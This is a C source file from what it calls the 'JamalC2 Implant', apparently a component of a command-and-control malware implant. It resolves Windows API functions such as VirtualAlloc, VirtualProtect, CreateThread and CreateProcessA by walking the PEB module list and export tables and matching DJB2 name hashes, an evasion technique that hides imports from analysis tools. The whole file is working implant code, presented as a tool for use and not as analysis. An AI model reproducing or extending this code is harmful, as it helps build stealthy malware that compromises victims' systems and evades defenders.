/*
 * JamalC2 Implant - Dynamic API Resolution
 * 动态 API 解析实现 - 通过哈希解析函数地址
 */

#include "dynapi.h"
#include <winternl.h>

// === 全局函数指针 ===

fn_VirtualAlloc pVirtualAlloc = NULL;
fn_VirtualFree pVirtualFree = NULL;
fn_VirtualProtect pVirtualProtect = NULL;
fn_CreateThread pCreateThread = NULL;
fn_CreateProcessA pCreateProcessA = NULL;
fn_LoadLibraryA pLoadLibraryA = NULL;
fn_GetProcAddress pGetProcAddress = NULL;

// === DJB2 哈希算法 ===

unsigned int dynapi_hash(const char *str) {
  unsigned int hash = 5381;
  int c;
  while ((c = *str++)) {
    hash = ((hash << 5) + hash) + c;
  }
  return hash;
}

// === 通过 PEB 获取模块基址 ===

static HMODULE get_module_by_hash(unsigned int hash) {
// 通过 PEB 遍历模块列表
#ifdef _WIN64
  PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
  PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

  PPEB_LDR_DATA pLdr = pPeb->Ldr;
  PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
  PLIST_ENTRY pListEntry = pListHead->Flink;

  while (pListEntry != pListHead) {
    PLDR_DATA_TABLE_ENTRY pEntry =
        CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    if (pEntry->FullDllName.Buffer != NULL) {
      // 将宽字符转为小写 ASCII 并计算哈希
      char dllName[256];
      int i;
      for (i = 0; i < pEntry->FullDllName.Length / 2 && i < 255; i++) {
        wchar_t wc = pEntry->FullDllName.Buffer[i];
        if (wc >= 'A' && wc <= 'Z') {
          dllName[i] = (char)(wc + 32);
        } else {
          dllName[i] = (char)wc;
        }
      }
      dllName[i] = '\0';

      // 提取文件名
      char *fileName = strrchr(dllName, '\\');
      if (fileName)
        fileName++;
      else
        fileName = dllName;

      if (dynapi_hash(fileName) == hash) {
        return (HMODULE)pEntry->DllBase;
      }
    }

    pListEntry = pListEntry->Flink;
  }

  return NULL;
}

// === 通过哈希解析导出函数 ===

void *dynapi_resolve_by_hash(HMODULE hModule, unsigned int hash) {
  if (hModule == NULL)
    return NULL;

  // 解析 PE 头
  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
  if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    return NULL;

  PIMAGE_NT_HEADERS pNtHeaders =
      (PIMAGE_NT_HEADERS)((BYTE *)hModule + pDosHeader->e_lfanew);
  if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    return NULL;

  // 获取导出表
  DWORD exportRva =
      pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  if (exportRva == 0)
    return NULL;

  PIMAGE_EXPORT_DIRECTORY pExportDir =
      (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hModule + exportRva);

  DWORD *pAddressOfFunctions =
      (DWORD *)((BYTE *)hModule + pExportDir->AddressOfFunctions);
  DWORD *pAddressOfNames =
      (DWORD *)((BYTE *)hModule + pExportDir->AddressOfNames);
  WORD *pAddressOfOrdinals =
      (WORD *)((BYTE *)hModule + pExportDir->AddressOfNameOrdinals);

  // 遍历导出函数名
  for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
    char *funcName = (char *)((BYTE *)hModule + pAddressOfNames[i]);

    if (dynapi_hash(funcName) == hash) {
      WORD ordinal = pAddressOfOrdinals[i];
      DWORD funcRva = pAddressOfFunctions[ordinal];
      return (void *)((BYTE *)hModule + funcRva);
    }
  }

  return NULL;
}

// === 初始化 ===

// 模块名哈希
#define HASH_KERNEL32 0xB045D49B // kernel32.dll
#define HASH_NTDLL 0x1A5A155E    // ntdll.dll

int dynapi_init(void) {
  HMODULE hKernel32 = get_module_by_hash(HASH_KERNEL32);
  if (hKernel32 == NULL) {
    // 降级：使用普通方式获取
    hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL)
      return -1;
  }

  // 解析函数地址
  pVirtualAlloc =
      (fn_VirtualAlloc)dynapi_resolve_by_hash(hKernel32, HASH_VIRTUALALLOC);
  pVirtualFree =
      (fn_VirtualFree)dynapi_resolve_by_hash(hKernel32, HASH_VIRTUALFREE);
  pVirtualProtect =
      (fn_VirtualProtect)dynapi_resolve_by_hash(hKernel32, HASH_VIRTUALPROTECT);
  pCreateThread =
      (fn_CreateThread)dynapi_resolve_by_hash(hKernel32, HASH_CREATETHREAD);
  pCreateProcessA =
      (fn_CreateProcessA)dynapi_resolve_by_hash(hKernel32, HASH_CREATEPROCESSA);
  pLoadLibraryA =
      (fn_LoadLibraryA)dynapi_resolve_by_hash(hKernel32, HASH_LOADLIBRARYA);
  pGetProcAddress =
      (fn_GetProcAddress)dynapi_resolve_by_hash(hKernel32, HASH_GETPROCADDRESS);

  // 检查关键函数是否成功解析
  if (pVirtualAlloc == NULL || pCreateProcessA == NULL) {
    return -1;
  }

  return 0;
}
